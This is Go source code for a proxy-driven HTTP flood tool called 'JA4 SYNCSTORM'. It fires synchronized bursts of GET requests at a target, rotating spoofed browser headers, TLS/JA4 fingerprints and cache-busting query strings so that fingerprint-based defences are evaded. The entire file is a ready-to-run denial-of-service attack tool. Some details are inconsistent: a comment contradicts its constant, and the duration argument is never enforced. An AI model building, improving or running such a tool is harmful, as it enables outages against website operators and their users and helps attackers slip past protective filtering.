// KRTech Σ 2025 – SIGMA JA4 SYNCSTORM vΩ: PHANTOM BLADE
// ALL PROXIES FIRE AT ONCE | JA4 Stealth | PH-Optimized | 180–320 B/request
package main

import (
	"bufio"
	"context"
	cryptorand "crypto/rand"
	"crypto/tls"
	"fmt"
	"io"
	"math"
	"math/big"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
	"golang.org/x/net/http2"
)

const (
	logisticR     = 3.9999999
	gnosticX0     = 0.618033
	burstInterval = 150 * time.Millisecond // All proxies fire every 200ms
	minBurstSize  = 3
	maxBurstSize  = 10
)

type JA4 struct {
	A string // Original JA4
	B string // Sorted cipher suites
	C string // Extensions + ALPN
}

type Profile struct {
	UA           string
	Accept       string
	Encoding     string
	Lang         string
	SecCH        string
	SecMobile    string
	SecPlatform  string
	NextProtos   []string
	CipherSuites []uint16
	CurvePrefs   []tls.CurveID
}

type Proxy struct {
	Addr       string
	Client     *http.Client
	Profile    *Profile
	Success    atomic.Int64
	Fail       atomic.Int64
	RPS        atomic.Int64
	JA4Drift   atomic.Int32
	mu         sync.Mutex
}

type SigmaSyncStorm struct {
	target     string
	duration   time.Duration
	proxies    []*Proxy
	success    atomic.Int64
	fail       atomic.Int64
	startTime  time.Time
	wg         sync.WaitGroup
	ctx        context.Context
	cancel     context.CancelFunc
	entropy    *rand.Rand
	chaosX     float64
	logger     *zap.Logger
	statusMap  map[int]*atomic.Int64
	mu         sync.Mutex
}

var minimalProfiles = []Profile{
	{
		UA:           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
		Accept:       "*/*",
		Encoding:     "gzip",
		Lang:         "en",
		SecCH:        `"Google Chrome";v="139"`,
		SecMobile:    "?0",
		SecPlatform:  `"Windows"`,
		NextProtos:   []string{"h2", "http/1.1"},
		CipherSuites: []uint16{tls.TLS_AES_128_GCM_SHA256},
		CurvePrefs:   []tls.CurveID{tls.X25519},
	},
	{
		UA:           "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
		Accept:       "*/*",
		Encoding:     "gzip",
		Lang:         "en",
		SecCH:        `"Safari";v="18"`,
		SecMobile:    "?1",
		SecPlatform:  `"iOS"`,
		NextProtos:   []string{"h2"},
		CipherSuites: []uint16{tls.TLS_AES_128_GCM_SHA256},
		CurvePrefs:   []tls.CurveID{tls.X25519},
	},
}

func computeJA4(tlsConfig *tls.Config) JA4 {
	return JA4{
		A: ja4a(tlsConfig),
		B: ja4b(tlsConfig),
		C: ja4c(tlsConfig),
	}
}

func ja4a(cfg *tls.Config) string {
	version := "TLS13"
	ciphers := fmt.Sprintf("%04x", len(cfg.CipherSuites))
	exts := fmt.Sprintf("%04x", len(cfg.CurvePreferences)+1) // +SNI
	alpn := "00"
	if len(cfg.NextProtos) > 0 {
		alpn = "01"
	}
	return fmt.Sprintf("%s_%s_%s_%s", version, ciphers, exts, alpn)
}

func ja4b(cfg *tls.Config) string {
	sorted := append([]uint16(nil), cfg.CipherSuites...)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	var b strings.Builder
	for i, c := range sorted {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(fmt.Sprintf("%04x", c))
	}
	return b.String()
}

func ja4c(cfg *tls.Config) string {
	exts := []string{"sni"}
	for _, c := range cfg.CurvePreferences {
		exts = append(exts, fmt.Sprintf("%04x", c))
	}
	if len(cfg.NextProtos) > 0 {
		exts = append(exts, "alpn")
	}
	return strings.Join(exts, "_")
}

func NewSigmaSyncStorm(target string, duration time.Duration, proxyList []string) (*SigmaSyncStorm, error) {
	if !strings.HasPrefix(target, "http") {
		target = "https://" + target
	}
	if _, err := url.Parse(target); err != nil {
		return nil, err
	}

	config := zap.NewProductionConfig()
	config.EncoderConfig = zapcore.EncoderConfig{
		EncodeLevel: zapcore.CapitalColorLevelEncoder,
		EncodeTime:  zapcore.ISO8601TimeEncoder,
	}
	logger, _ := config.Build()

	ctx, cancel := context.WithCancel(context.Background())
	seedBig, err := cryptorand.Int(cryptorand.Reader, big.NewInt(math.MaxInt64))
	if err != nil {
		return nil, err
	}
	entropy := rand.New(rand.NewSource(seedBig.Int64()))

	s := &SigmaSyncStorm{
		target:    target,
		duration:  duration,
		startTime: time.Now(),
		ctx:       ctx,
		cancel:    cancel,
		entropy:   entropy,
		chaosX:    gnosticX0,
		logger:    logger,
		statusMap: make(map[int]*atomic.Int64),
	}

	for _, addr := range proxyList {
		proxyURL, _ := url.Parse("http://" + addr)
		profile := generatePolymorphicProfile(s)
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS13,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       profile.CipherSuites,
			CurvePreferences:   profile.CurvePrefs,
			NextProtos:         profile.NextProtos,
		}

		transport := &http.Transport{
			Proxy:               http.ProxyURL(proxyURL),
			MaxIdleConns:        500,
			MaxIdleConnsPerHost: 500,
			IdleConnTimeout:     20 * time.Second,
			TLSClientConfig:     tlsConfig,
			DisableKeepAlives:   true,
			ForceAttemptHTTP2:   true,
			DialContext: (&net.Dialer{
				Timeout:   1500 * time.Millisecond,
				KeepAlive: 5 * time.Second,
			}).DialContext,
		}
		http2.ConfigureTransport(transport)

		client := &http.Client{
			Transport: transport,
			Timeout:   5 * time.Second,
		}

		s.proxies = append(s.proxies, &Proxy{
			Addr:    addr,
			Client:  client,
			Profile: profile,
		})
	}

	if len(s.proxies) == 0 {
		return nil, fmt.Errorf("no proxies")
	}
	return s, nil
}

func generatePolymorphicProfile(s *SigmaSyncStorm) *Profile {
	s.mu.Lock()
	s.chaosX = logisticR * s.chaosX * (1 - s.chaosX)
	mut := s.chaosX
	s.mu.Unlock()

	rng := s.entropy
	base := minimalProfiles[rng.Intn(len(minimalProfiles))]
	prof := &Profile{
		UA:           base.UA,
		Accept:       base.Accept,
		Encoding:     base.Encoding,
		Lang:         base.Lang,
		SecCH:        base.SecCH,
		SecMobile:    base.SecMobile,
		SecPlatform:  base.SecPlatform,
		NextProtos:   append([]string(nil), base.NextProtos...),
		CipherSuites: append([]uint16(nil), base.CipherSuites...),
		CurvePrefs:   append([]tls.CurveID(nil), base.CurvePrefs...),
	}

	if mut < 0.4 {
		prof.NextProtos = []string{"http/1.1"}
	} else if mut > 0.8 {
		prof.NextProtos = []string{"h2", "http/1.1"}
	}

	if mut < 0.2 {
		grease := []uint16{0x0a0a, 0x1a1a, 0x2a2a}[rng.Intn(3)]
		prof.CipherSuites = append([]uint16{grease}, prof.CipherSuites...)
	}

	return prof
}

func (s *SigmaSyncStorm) Run() {
	s.logger.Info("JA4 SYNCSTORM INIT", zap.String("target", s.target), zap.Int("proxies", len(s.proxies)))
	s.wg.Add(1)
	go s.coordinator()
	go s.dashboard()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; s.cancel() }()

	<-s.ctx.Done()
	s.wg.Wait()
	s.report()
}

func (s *SigmaSyncStorm) coordinator() {
	defer s.wg.Done()
	ticker := time.NewTicker(burstInterval)
	defer ticker.Stop()

	for {
		select {
		case <-s.ctx.Done():
			return
		case <-ticker.C:
			s.fireBurst()
		}
	}
}

func (s *SigmaSyncStorm) fireBurst() {
	var wg sync.WaitGroup
	burstSize := minBurstSize + s.entropy.Intn(maxBurstSize-minBurstSize+1)

	for i := 0; i < burstSize; i++ {
		for _, p := range s.proxies {
			wg.Add(1)
			go func(proxy *Proxy, seq int) {
				defer wg.Done()
				s.sendRequest(proxy, seq)
			}(p, i)
		}
	}
	wg.Wait()
}

func (s *SigmaSyncStorm) sendRequest(p *Proxy, seq int) {
	rng := rand.New(rand.NewSource(time.Now().UnixNano() ^ int64(seq)))

	if rng.Float64() < 0.1 {
		p.mu.Lock()
		p.Profile = generatePolymorphicProfile(s)
		p.JA4Drift.Add(1)
		p.mu.Unlock()
	}

	u := s.target
	if rng.Float64() < 0.7 {
		u += "?t=" + strconv.FormatInt(rng.Int63n(1e12), 36)
	}

	req, _ := http.NewRequestWithContext(s.ctx, "GET", u, nil)
	req.Header.Set("User-Agent", p.Profile.UA)
	req.Header.Set("Accept", p.Profile.Accept)
	req.Header.Set("Accept-Encoding", p.Profile.Encoding)
	req.Header.Set("Accept-Language", p.Profile.Lang)
	req.Header.Set("Sec-CH-UA", p.Profile.SecCH)
	req.Header.Set("Sec-CH-UA-Mobile", p.Profile.SecMobile)
	req.Header.Set("Sec-CH-UA-Platform", p.Profile.SecPlatform)

	resp, err := p.Client.Do(req)
	if err != nil {
		s.fail.Add(1)
		s.status(0).Add(1)
		return
	}
	p.RPS.Add(1)

	code := resp.StatusCode
	s.status(code).Add(1)
	if code == 200 {
		s.success.Add(1)
		p.Success.Add(1)
	} else if code >= 400 {
		s.fail.Add(1)
	}

	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
}

func (s *SigmaSyncStorm) status(code int) *atomic.Int64 {
	s.mu.Lock()
	defer s.mu.Unlock()
	if _, ok := s.statusMap[code]; !ok {
		s.statusMap[code] = &atomic.Int64{}
	}
	return s.statusMap[code]
}

func (s *SigmaSyncStorm) dashboard() {
	t := time.NewTicker(1 * time.Second)
	defer t.Stop()
	const (
		reset = "\033[0m"
		green = "\033[32m"
		red   = "\033[31m"
		yell  = "\033[33m"
		mag   = "\033[35m"
		cyan  = "\033[36m"
		white = "\033[97m"
	)

	for range t.C {
		up := time.Since(s.startTime)
		total := s.success.Load() + s.fail.Load()
		rps := 0.0
		if up.Seconds() > 0 {
			rps = float64(total) / up.Seconds()
		}

		ja4Samples := map[string]int{}
		drift := int32(0)
		for _, p := range s.proxies {
			drift += p.JA4Drift.Load()
			transport := p.Client.Transport.(*http.Transport)
			sample := computeJA4(transport.TLSClientConfig)
			key := sample.A + "_" + strconv.Itoa(len(sample.B))
			ja4Samples[key]++
		}

		var topJA4 []string
		for k := range ja4Samples {
			topJA4 = append(topJA4, k)
		}
		sort.Strings(topJA4)
		if len(topJA4) > 3 {
			topJA4 = topJA4[:3]
		}
		ja4Line := ""
		for i, j := range topJA4 {
			if i > 0 {
				ja4Line += " "
			}
			ja4Line += fmt.Sprintf("%sJA4%s:%s", mag, reset, j)
		}
		if ja4Line == "" {
			ja4Line = mag + "JA4: drifting..." + reset
		}

		var st strings.Builder
		for c := 100; c <= 599; c++ {
			if v := s.status(c).Load(); v > 0 {
				col := white
				switch {
				case c == 200:
					col = green
				case c >= 300 && c < 400:
					col = yell
				case c >= 400 && c < 500:
					col = red
				case c >= 500:
					col = mag
				}
				fmt.Fprintf(&st, " %d:%s%d%s", c, col, v, reset)
			}
		}
		if st.Len() == 0 {
			st.WriteString(" firing...")
		}

		fmt.Printf("\r%s[JA4 SYNCSTORM]%s | %s | RPS:%.0f | P:%d | BURST:%d | UP:%s%s",
			cyan, st.String(), ja4Line, rps, len(s.proxies), maxBurstSize, up.Truncate(time.Millisecond), reset)
	}
}

func (s *SigmaSyncStorm) report() {
	up := time.Since(s.startTime)
	rps := 0.0
	if up.Seconds() > 0 {
		rps = float64(s.success.Load()+s.fail.Load()) / up.Seconds()
	}
	drift := int32(0)
	for _, p := range s.proxies {
		drift += p.JA4Drift.Load()
	}
	fmt.Printf("\n\nJA4 SYNCSTORM COMPLETE | %.0f RPS | %d PROXIES | JA4 DRIFT:%d | %s UP\n", rps, len(s.proxies), drift, up.Truncate(time.Second))
}

func loadProxies(file string) ([]string, error) {
	f, err := os.Open(file)
	if err != nil {
		return nil, err
	}
	defer f.Close()
	var list []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		l := strings.TrimSpace(sc.Text())
		if l != "" && !strings.HasPrefix(l, "#") && strings.Contains(l, ":") {
			list = append(list, l)
		}
	}
	return list, sc.Err()
}

func main() {
	if len(os.Args) != 4 {
		fmt.Println("Usage: syncstorm <target> <seconds> <proxies.txt>")
		os.Exit(1)
	}
	target := os.Args[1]
	dur, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Invalid duration: %v\n", err)
		os.Exit(1)
	}
	proxyFile := os.Args[3]

	proxies, err := loadProxies(proxyFile)
	if err != nil || len(proxies) == 0 {
		fmt.Printf("Proxy load failed: %v\n", err)
		os.Exit(1)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())

	s, err := NewSigmaSyncStorm(target, time.Duration(dur)*time.Second, proxies)
	if err != nil {
		fmt.Printf("Init error: %v\n", err)
		os.Exit(1)
	}
	s.Run()
}
